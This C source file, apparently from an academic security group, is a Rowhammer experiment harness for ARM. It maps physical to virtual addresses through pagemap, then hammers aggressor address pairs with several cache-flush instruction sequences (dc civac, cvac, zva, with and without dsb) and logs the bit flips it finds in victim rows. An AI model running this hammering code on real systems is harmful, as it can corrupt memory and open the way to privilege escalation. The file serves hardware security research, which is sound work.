/**
  * compare_all_instr -- compare effectiveness of different approaches
  * By VandySec Group
**/
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h> 
#include <pagemap.h>
#include <linux/perf_event.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <pthread.h>

#define CHUNK_SIZE    0x40000000
#define VPN_SIZE      0x80000
#define PAGE_SIZE     4096
#define ROW_SIZE      8192
#define VAL_SIZE      sizeof(unsigned long)
#define HAMMER_ROUND  5000000

#define INPUT_FILE    "input/flippable_all"
#define OUT_INTERVAL  200

struct attkr_t{
  unsigned long pa1;
  unsigned long pa2;
  unsigned long va1;
  unsigned long va2;
  unsigned long vctm_base;
  unsigned long init_val;
  struct attkr_t *next;
};

unsigned long chunk[CHUNK_SIZE / VAL_SIZE];
unsigned long va_tab[VPN_SIZE];
unsigned cnt = 0;

void
generate_va_table(int pgmp)
{
  for (int i = 0; i < CHUNK_SIZE / VAL_SIZE; i += PAGE_SIZE / VAL_SIZE){
    unsigned long data;
    unsigned long index = (unsigned long)&chunk[i] / PAGE_SIZE * sizeof(data);
    if (pread(pgmp, &data, sizeof(data), index) != sizeof(data)) {
      perror("pread");
      break;
    }
    unsigned long pfn = data & 0x7fffffffffffff;
    if (pfn <= 0 || pfn > VPN_SIZE){
      perror("VPN_TABLE TOO SMALL");
      break;
    }
    else
      va_tab[pfn] = index / sizeof(data) * PAGE_SIZE; 
  }
}

unsigned long *
pa_to_va(unsigned long pa)
{
  unsigned long va_off = pa % PAGE_SIZE;
  unsigned long va_pfn = pa / PAGE_SIZE;
  if (va_tab[va_pfn] == 0)
    return 0;
  else 
    return (unsigned long *)(va_tab[va_pfn] + va_off);
}

struct attkr_t *
generate_addr_list(char *fname)
{
  FILE *f_in = fopen(fname, "r");
  char str[999];
  unsigned long attk_pa1, attk_pa2, attk_pfn1, attk_pfn2, init_val;
  struct attkr_t *head, *curr, *prev;
  head = NULL;
  curr = head;
  while (fscanf(f_in, "%s", str) != EOF){
    attk_pa1 = (unsigned long)strtol(str, NULL, 16);
    fscanf(f_in, "%s", str);
    attk_pa2 = (unsigned long)strtol(str, NULL, 16);
    fscanf(f_in, "%s", str);
    init_val = (unsigned long)(-strtol(str, NULL, 10));
    attk_pfn1 = attk_pa1 / PAGE_SIZE;
    attk_pfn2 = attk_pa2 / PAGE_SIZE;

    curr = (struct attkr_t *)malloc(sizeof(struct attkr_t));
    curr->pa1 = attk_pa1;
    curr->pa2 = attk_pa2;
    curr->va1 = (unsigned long)pa_to_va(attk_pa1);
    curr->va2 = (unsigned long)pa_to_va(attk_pa2);
    curr->vctm_base = (attk_pfn1 + attk_pfn2) / 2 * PAGE_SIZE;
    curr->init_val = init_val;
    curr->next = NULL;

    if (curr->va1 == 0 || curr->va2 == 0){
      free(curr);
      continue;
    }
    else if (head == NULL){
      head = curr;
      prev = head;
    }
    else {
      prev->next = curr;
      prev = prev->next;
    }
  }
  fclose(f_in);
  return head;
}

int
main(int argc, char **argv)
{ 
  unsigned i, j;
  unsigned long addr1, addr2;
  unsigned long temp = -1;
  FILE *fp, *fcnt;
  char path[200];
  sprintf(path, "/proc/%u/pagemap", getpid());
  int pgmp = open(path, O_RDONLY);
  unsigned long vctm_pa, *vctm_va, val;
  char str[999];
  struct attkr_t *head, *curr;
  // initialize chunk
  for (i = 0; i < CHUNK_SIZE / VAL_SIZE; ++i)
    chunk[i] = -1;
  // generate pa-va mapping
  generate_va_table(pgmp);
  head = generate_addr_list(INPUT_FILE);

  // START CIVAC + STR without DSB
  fp = fopen("results/addr_civac_ldr_wo.txt", "w");
  fcnt = fopen("results/cnt_civac_ldr_wo.txt","w");
  printf("civac_ldr_wo\n");
  i = 0;
  cnt = 0;
  for(curr = head; curr != NULL; curr = curr->next){
    addr1 = curr->va1;
    addr2 = curr->va2;
    if (addr1 == 0 || addr2 == 0)
      continue;
    i++;
    memset(chunk, curr->init_val, CHUNK_SIZE);
    temp = curr->init_val;
    // DIFFERENT INSTRUCTIONS
    for (j = 0; j < HAMMER_ROUND; ++j) {
      asm volatile(
        "ldr %2, [%0]\n\t"
        "ldr %2, [%1]\n\t"
        "dc civac, %0\n\t"
        "dc civac, %1\n\t"
        //"dsb 0xb"
        ::"r" (addr1), "r" (addr2), "r" (temp)
      );
    }
    // DIFFERENT INSTRUCTIONS
    for (j = 0; j < ROW_SIZE; j += VAL_SIZE) {
      // check victim row only
      vctm_pa = curr->vctm_base + j;
      vctm_va = pa_to_va(vctm_pa);
      if (vctm_va == 0)
        continue;
      val = *vctm_va;
      if (val != curr->init_val) {
        cnt++;
        printf("attkr1:%lx\tattkr2:%lx\n", curr->pa1, curr->pa2);
        printf("rnd:%u\tcnt:%u\tvctm:%lx to %lx\n", i, cnt, vctm_pa, val);
        fprintf(fp,"%lx\t%lx\t%lu\n", curr->pa1, curr->pa2, -(curr->init_val));
        fprintf(fcnt,"%u\t%u\n\n", i, cnt);
      }
      *vctm_va = curr->init_val;
    }
    if (i % OUT_INTERVAL == 0 )
      printf("round:%u\tcount:%u\n\n", i, cnt);
  }
  fclose(fp);
  fclose(fcnt);
  // END CIVAC + STR without DSB
  
  // repeat the previous operations with different instructions for the rest
  
  // START
  fp = fopen("results/addr_civac_ldr_w.txt", "w");
  fcnt = fopen("results/cnt_civac_ldr_w.txt","w");
  i = 0;
  cnt = 0;
  printf("civac_ldr_w\n");
  for(curr = head; curr != NULL; curr = curr->next){
    addr1 = curr->va1;
    addr2 = curr->va2;
    if (addr1 == 0 || addr2 == 0)
      continue;
    i++;
    memset(chunk, curr->init_val, CHUNK_SIZE);
    temp = curr->init_val;
    // DIFF
    for (j = 0; j < HAMMER_ROUND; ++j) {
      asm volatile(
        "ldr %2, [%0]\n\t"
        "ldr %2, [%1]\n\t"
        "dc civac, %0\n\t"
        "dc civac, %1\n\t"
        "dsb 0xb"
        ::"r" (addr1), "r" (addr2), "r" (temp)
      );
    }
    // DIFF
    for (j = 0; j < ROW_SIZE; j += VAL_SIZE) {
      // check victim row only
      vctm_pa = curr->vctm_base + j;
      vctm_va = pa_to_va(vctm_pa);
      if (vctm_va == 0)
        continue;
      val = *vctm_va;
      if (val != curr->init_val) {
        cnt++;
        printf("attkr1:%lx\tattkr2:%lx\n", curr->pa1, curr->pa2);
        printf("rnd:%u\tcnt:%u\tvctm:%lx to %lx\n", i, cnt, vctm_pa, val);
        fprintf(fp,"%lx\t%lx\t%lu\n", curr->pa1, curr->pa2, -(curr->init_val));
        fprintf(fcnt,"%u\t%u\n\n", i, cnt);
      }
      *vctm_va = curr->init_val;
    }
    if (i % OUT_INTERVAL == 0 )
      printf("round:%u\tcount:%u\n\n", i, cnt);
  }
  fclose(fp);
  fclose(fcnt);
  // END

  // START
  fp = fopen("results/addr_civac_str_wo.txt", "w");
  fcnt = fopen("results/cnt_civac_str_wo.txt","w");
  i = 0;
  cnt = 0;
  printf("civac_str_wo\n");
  for(curr = head; curr != NULL; curr = curr->next){
    addr1 = curr->va1;
    addr2 = curr->va2;
    if (addr1 == 0 || addr2 == 0)
      continue;
    i++;
    memset(chunk, curr->init_val, CHUNK_SIZE);
    temp = curr->init_val;
    // DIFF
    for (j = 0; j < HAMMER_ROUND; ++j) {
      asm volatile(
        "str %2, [%0]\n\t"
        "str %2, [%1]\n\t"
        "dc civac, %0\n\t"
        "dc civac, %1\n\t"
        //"dsb 0xb"
        ::"r" (addr1), "r" (addr2), "r" (temp)
      );
    }
    // DIFF
    for (j = 0; j < ROW_SIZE; j += VAL_SIZE) {
      // check victim row only
      vctm_pa = curr->vctm_base + j;
      vctm_va = pa_to_va(vctm_pa);
      if (vctm_va == 0)
        continue;
      val = *vctm_va;
      if (val != curr->init_val) {
        cnt++;
        printf("attkr1:%lx\tattkr2:%lx\n", curr->pa1, curr->pa2);
        printf("rnd:%u\tcnt:%u\tvctm:%lx to %lx\n", i, cnt, vctm_pa, val);
        fprintf(fp,"%lx\t%lx\t%lu\n", curr->pa1, curr->pa2, -(curr->init_val));
        fprintf(fcnt,"%u\t%u\n\n", i, cnt);
      }
      *vctm_va = curr->init_val;
    }
    if (i % OUT_INTERVAL == 0 )
      printf("round:%u\tcount:%u\n\n", i, cnt);
  }
  fclose(fp);
  fclose(fcnt);
  // END

  // START
  fp = fopen("results/addr_civac_str_w.txt", "w");
  fcnt = fopen("results/cnt_civac_str_w.txt","w");
  i = 0;
  cnt = 0;
  printf("civac_str_w\n");
  for(curr = head; curr != NULL; curr = curr->next){
    addr1 = curr->va1;
    addr2 = curr->va2;
    if (addr1 == 0 || addr2 == 0)
      continue;
    i++;
    memset(chunk, curr->init_val, CHUNK_SIZE);
    temp = curr->init_val;
    // DIFF
    for (j = 0; j < HAMMER_ROUND; ++j) {
      asm volatile(
        "str %2, [%0]\n\t"
        "str %2, [%1]\n\t"
        "dc civac, %0\n\t"
        "dc civac, %1\n\t"
        "dsb 0xb"
        ::"r" (addr1), "r" (addr2), "r" (temp)
      );
    }
    // DIFF
    for (j = 0; j < ROW_SIZE; j += VAL_SIZE) {
      // check victim row only
      vctm_pa = curr->vctm_base + j;
      vctm_va = pa_to_va(vctm_pa);
      if (vctm_va == 0)
        continue;
      val = *vctm_va;
      if (val != curr->init_val) {
        cnt++;
        printf("attkr1:%lx\tattkr2:%lx\n", curr->pa1, curr->pa2);
        printf("rnd:%u\tcnt:%u\tvctm:%lx to %lx\n", i, cnt, vctm_pa, val);
        fprintf(fp,"%lx\t%lx\t%lu\n", curr->pa1, curr->pa2, -(curr->init_val));
        fprintf(fcnt,"%u\t%u\n\n", i, cnt);
      }
      *vctm_va = curr->init_val;
    }
    if (i % OUT_INTERVAL == 0 )
      printf("round:%u\tcount:%u\n\n", i, cnt);
  }
  fclose(fp);
  fclose(fcnt);
  // END

  // START
  fp = fopen("results/addr_cvac_str_wo.txt", "w");
  fcnt = fopen("results/cnt_cvac_str_wo.txt","w");
  i = 0;
  cnt = 0;
  printf("cvac_str_wo\n");
  for(curr = head; curr != NULL; curr = curr->next){
    addr1 = curr->va1;
    addr2 = curr->va2;
    if (addr1 == 0 || addr2 == 0)
      continue;
    i++;
    memset(chunk, curr->init_val, CHUNK_SIZE);
    temp = curr->init_val;
    // DIFF
    for (j = 0; j < HAMMER_ROUND; ++j) {
      asm volatile(
        "str %2, [%0]\n\t"
        "str %2, [%1]\n\t"
        "dc cvac, %0\n\t"
        "dc cvac, %1\n\t"
        //"dsb 0xb"
        ::"r" (addr1), "r" (addr2), "r" (temp)
      );
    }
    // DIFF
    for (j = 0; j < ROW_SIZE; j += VAL_SIZE) {
      // check victim row only
      vctm_pa = curr->vctm_base + j;
      vctm_va = pa_to_va(vctm_pa);
      if (vctm_va == 0)
        continue;
      val = *vctm_va;
      if (val != curr->init_val) {
        cnt++;
        printf("attkr1:%lx\tattkr2:%lx\n", curr->pa1, curr->pa2);
        printf("rnd:%u\tcnt:%u\tvctm:%lx to %lx\n", i, cnt, vctm_pa, val);
        fprintf(fp,"%lx\t%lx\t%lu\n", curr->pa1, curr->pa2, -(curr->init_val));
        fprintf(fcnt,"%u\t%u\n\n", i, cnt);
      }
      *vctm_va = curr->init_val;
    }
    if (i % OUT_INTERVAL == 0 )
      printf("round:%u\tcount:%u\n\n", i, cnt);
  }
  fclose(fp);
  fclose(fcnt);
  // END

  // START
  fp = fopen("results/addr_cvac_str_w.txt", "w");
  fcnt = fopen("results/cnt_cvac_str_w.txt","w");
  i = 0;
  cnt = 0;
  printf("cvac_str_w\n");
  for(curr = head; curr != NULL; curr = curr->next){
    addr1 = curr->va1;
    addr2 = curr->va2;
    if (addr1 == 0 || addr2 == 0)
      continue;
    i++;
    memset(chunk, curr->init_val, CHUNK_SIZE);
    temp = curr->init_val;
    // DIFF
    for (j = 0; j < HAMMER_ROUND; ++j) {
      asm volatile(
        "str %2, [%0]\n\t"
        "str %2, [%1]\n\t"
        "dc cvac, %0\n\t"
        "dc cvac, %1\n\t"
        "dsb 0xb"
        ::"r" (addr1), "r" (addr2), "r" (temp)
      );
    }
    // DIFF
    for (j = 0; j < ROW_SIZE; j += VAL_SIZE) {
      // check victim row only
      vctm_pa = curr->vctm_base + j;
      vctm_va = pa_to_va(vctm_pa);
      if (vctm_va == 0)
        continue;
      val = *vctm_va;
      if (val != curr->init_val) {
        cnt++;
        printf("attkr1:%lx\tattkr2:%lx\n", curr->pa1, curr->pa2);
        printf("rnd:%u\tcnt:%u\tvctm:%lx to %lx\n", i, cnt, vctm_pa, val);
        fprintf(fp,"%lx\t%lx\t%lu\n", curr->pa1, curr->pa2, -(curr->init_val));
        fprintf(fcnt,"%u\t%u\n\n", i, cnt);
      }
      *vctm_va = curr->init_val;
    }
    if (i % OUT_INTERVAL == 0 )
      printf("round:%u\tcount:%u\n\n", i, cnt);
  }
  fclose(fp);
  fclose(fcnt);
  // END

  // START DC ZVA W/O DSB
  fp = fopen("results/addr_zva_wo.txt", "w");
  fcnt = fopen("results/cnt_zva_wo.txt","w");
  i = 0;
  cnt = 0;
  printf("zva_wo\n");
  for(curr = head; curr != NULL; curr = curr->next){
    addr1 = curr->va1;
    addr2 = curr->va2;
    if (addr1 == 0 || addr2 == 0)
      continue;
    i++;
    memset(chunk, curr->init_val, CHUNK_SIZE);
    temp = curr->init_val;
    // DIFF
    asm volatile(
      "dc civac, %0\n\t"
      "dc civac, %1\n\t"
      ::"r" (addr1), "r" (addr2)
    );
    for (j = 0; j < HAMMER_ROUND; ++j) {
      asm volatile(
        "dc zva, %0\n\t"
        "dc zva, %1\n\t"
        //"dsb 0xb"
        ::"r" (addr1), "r" (addr2)
      );
    }
    // DIFF
    for (j = 0; j < ROW_SIZE; j += VAL_SIZE) {
      // check victim row only
      vctm_pa = curr->vctm_base + j;
      vctm_va = pa_to_va(vctm_pa);
      if (vctm_va == 0)
        continue;
      val = *vctm_va;
      if (val != curr->init_val) {
        cnt++;
        printf("attkr1:%lx\tattkr2:%lx\n", curr->pa1, curr->pa2);
        printf("rnd:%u\tcnt:%u\tvctm:%lx to %lx\n", i, cnt, vctm_pa, val);
        fprintf(fp,"%lx\t%lx\t%lu\n", curr->pa1, curr->pa2, -(curr->init_val));
        fprintf(fcnt,"%u\t%u\n\n", i, cnt);
      }
      *vctm_va = curr->init_val;
    }
    if (i % OUT_INTERVAL == 0 )
      printf("round:%u\tcount:%u\n\n", i, cnt);
  }
  fclose(fp);
  fclose(fcnt);
  // END

  // START DC ZVA W/ DSB
  fp = fopen("results/addr_zva_w.txt", "w");
  fcnt = fopen("results/cnt_zva_w.txt","w");
  i = 0;
  cnt = 0;
  printf("zva_w\n");
  for(curr = head; curr != NULL; curr = curr->next){
    addr1 = curr->va1;
    addr2 = curr->va2;
    if (addr1 == 0 || addr2 == 0)
      continue;
    i++;
    memset(chunk, curr->init_val, CHUNK_SIZE);
    temp = curr->init_val;
    // DIFF
    asm volatile(
      "dc civac, %0\n\t"
      "dc civac, %1\n\t"
      ::"r" (addr1), "r" (addr2)
    );
    for (j = 0; j < HAMMER_ROUND; ++j) {
      asm volatile(
        "dc zva, %0\n\t"
        "dc zva, %1\n\t"
        "dsb 0xb"
        ::"r" (addr1), "r" (addr2)
      );
    }
    // DIFF
    for (j = 0; j < ROW_SIZE; j += VAL_SIZE) {
      // check victim row only
      vctm_pa = curr->vctm_base + j;
      vctm_va = pa_to_va(vctm_pa);
      if (vctm_va == 0)
        continue;
      val = *vctm_va;
      if (val != curr->init_val) {
        cnt++;
        printf("attkr1:%lx\tattkr2:%lx\n", curr->pa1, curr->pa2);
        printf("rnd:%u\tcnt:%u\tvctm:%lx to %lx\n", i, cnt, vctm_pa, val);
        fprintf(fp,"%lx\t%lx\t%lu\n", curr->pa1, curr->pa2, -(curr->init_val));
        fprintf(fcnt,"%u\t%u\n\n", i, cnt);
      }
      *vctm_va = curr->init_val;
    }
    if (i % OUT_INTERVAL == 0 )
      printf("round:%u\tcount:%u\n\n", i, cnt);
  }
  fclose(fp);
  fclose(fcnt);
  // END

  close(pgmp);
}

